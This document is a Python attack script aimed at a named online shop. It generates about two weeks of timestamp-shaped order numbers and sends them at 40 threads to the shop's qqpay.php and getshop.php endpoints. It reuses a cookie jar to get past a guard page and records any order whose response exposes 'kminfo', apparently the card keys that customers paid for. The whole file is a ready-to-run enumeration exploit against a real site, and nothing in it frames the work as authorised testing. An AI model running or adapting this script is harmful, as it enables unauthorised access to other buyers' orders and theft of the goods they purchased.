#!/usr/bin/env python3
"""yujuqq qqpay 订单号 Oracle + getshop 状态/kminfo 扫描."""
from __future__ import annotations

import concurrent.futures
import json
import re
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

BASE = "https://yujuqq.top/shop"
OUT = Path(f"/tmp/yujuqq_tn_{int(time.time())}")
OUT.mkdir(exist_ok=True)
CK = str(OUT / "cookies.jar")
NOT_FOUND = "该订单号不存在"
GUARD_MARK = "_guard/html.js"


def curl(url: str) -> tuple[int, str]:
    cmd = [
        "curl", "-sk", "--max-time", "12", "-b", CK, "-A", "Mozilla/5.0",
        "-H", "Accept-Language: zh-CN,zh;q=0.9", url,
    ]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.returncode, r.stdout


def warmup() -> None:
    subprocess.run(
        ["curl", "-sk", "-m", "20", "-c", CK, "-b", CK, "-A", "Mozilla/5.0",
         "-H", "Accept-Language: zh-CN", f"{BASE}/", "-o", "/dev/null"],
        check=False,
    )


def gen_tradenos(days: int = 14) -> list[str]:
    out: list[str] = []
    for day_offset in range(days):
        d = datetime.now() - timedelta(days=day_offset)
        prefix = d.strftime("%Y%m%d")
        for h in range(24):
            for m in range(0, 60, 3):
                for s in (0, 15, 30, 45):
                    for suf in range(0, 1000, 25):
                        tn = f"{prefix}{h:02d}{m:02d}{s:02d}{suf:03d}"
                        if len(tn) == 17:
                            out.append(tn)
    return list(dict.fromkeys(out))


def qqpay_probe(tn: str) -> tuple[str, str, str] | None:
    rc, body = curl(f"{BASE}/other/qqpay.php?trade_no={tn}")
    if not body or GUARD_MARK in body or NOT_FOUND in body:
        return None
    kind = "exists"
    if "支付" in body or "qr" in body.lower() or "mqqapi" in body:
        kind = "pay_page"
    return tn, kind, body[:200]


def getshop_probe(tn: str) -> dict | None:
    rc, body = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    if not body.strip() or GUARD_MARK in body:
        return None
    try:
        j = json.loads(body)
    except json.JSONDecodeError:
        return {"trade_no": tn, "raw": body[:300]}
    if j.get("code") == 0 or "kminfo" in body or j.get("msg") not in ("未付款", "No trade_no!"):
        return j
    return None


def main() -> int:
    warmup()
    tradenos = gen_tradenos(14)
    log = (OUT / "log.txt").open("a")
    log.write(f"tradenos={len(tradenos)}\n")

    exists: list[dict] = []
    paid: list[dict] = []

    def scan(tn: str) -> None:
        hit = qqpay_probe(tn)
        if hit:
            tn, kind, snippet = hit
            row = {"trade_no": tn, "kind": kind, "snippet": snippet}
            exists.append(row)
            log.write(f"QQPAY {tn} {kind} {snippet[:80]}\n")
            log.flush()
            gs = getshop_probe(tn)
            if gs:
                paid.append(gs)
                log.write(f"GETSHOP {tn} {json.dumps(gs, ensure_ascii=False)[:300]}\n")
                log.flush()
                print(f"HIT getshop {tn} => {json.dumps(gs, ensure_ascii=False)[:200]}", flush=True)

    print(f"scan start n={len(tradenos)} out={OUT}", flush=True)
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for i, _ in enumerate(ex.map(scan, tradenos, chunksize=50)):
            if i and i % 5000 == 0:
                print(f"progress {i}/{len(tradenos)} exists={len(exists)} paid={len(paid)}", flush=True)

    findings = {"exists": exists, "paid": paid}
    (OUT / "findings.json").write_text(json.dumps(findings, ensure_ascii=False, indent=2))
    print(f"DONE exists={len(exists)} paid={len(paid)} out={OUT}", flush=True)
    return 0 if paid else 2


if __name__ == "__main__":
    sys.exit(main())
